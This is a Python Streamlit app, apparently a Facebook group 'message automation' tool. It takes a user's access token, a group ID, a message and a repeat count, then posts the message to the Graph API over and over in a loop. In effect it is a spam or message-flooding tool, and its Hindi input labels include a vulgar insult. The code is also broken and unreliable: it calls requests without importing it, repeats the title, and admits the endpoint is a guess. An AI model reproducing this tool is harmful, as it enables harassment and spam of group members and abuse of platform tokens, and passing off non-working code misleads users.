import streamlit as st

# --- Custom CSS for colorful gradient background and watermark ---
st.markdown(
    """
    <style>
    .stApp {
        background: linear-gradient(135deg, #f7b733, #fc4a1a, #12c2e9, #c471f5, #f64f59);
        background-size: 400% 400%;
        animation: gradientBG 15s ease infinite;
        position: relative;
    }
    @keyframes gradientBG {
        0% {background-position:0% 50%}
        50% {background-position:100% 50%}
        100% {background-position:0% 50%}
    }
    .watermark {
        position: fixed;
        bottom: 30px;
        right: 30px;
        font-size: 60px;
        color: rgba(255,255,255,0.25);
        font-weight: bold;
        z-index: 9999;
        pointer-events: none;
        user-select: none;
        font-family: sans-serif;
        transform: rotate(-10deg);
    }
    </style>
    <div class="watermark">Mohit</div>
    """, unsafe_allow_html=True
)

# --- Your Streamlit app code below ---
st.title("Facebook Group Message Automation")
st.write("This demo uses a colourful animated background with a watermark.")


st.title("Facebook Group Message Automation")

# --- User Input ---
fb_token = st.text_input("TOKEN DAAL LAWDE", type="password")
group_id = st.text_input("GROUP NUMBER DAAL")
message_text = st.text_area("Message to Send")
num_messages = st.number_input("KITNI BAAR BHEJNA HAI ?", min_value=1, value=1)

if st.button("Send Message"):
    sent = 0
    for _ in range(int(num_messages)):
        # The correct endpoint and parameters may differ according to API documentation and group permissions
        url = f"https://graph.facebook.com/v15.0/t_{group_id}"
        headers = {'Content-Type': 'application/json'}
        params = {
            'access_token': fb_token,
            'message': message_text,
        }

        response = requests.post(url, json=params, headers=headers)
        if response.ok:
            st.success(f"Message sent (attempt #{sent+1})")
            sent += 1
        else:
            st.error(f"Failed (attempt #{sent+1}): {response.text}")
            break

if st.button("About"):
    st.info("This app lets you automate group messages to Facebook group conversations if your token and ID are valid and you have permissions.")
    
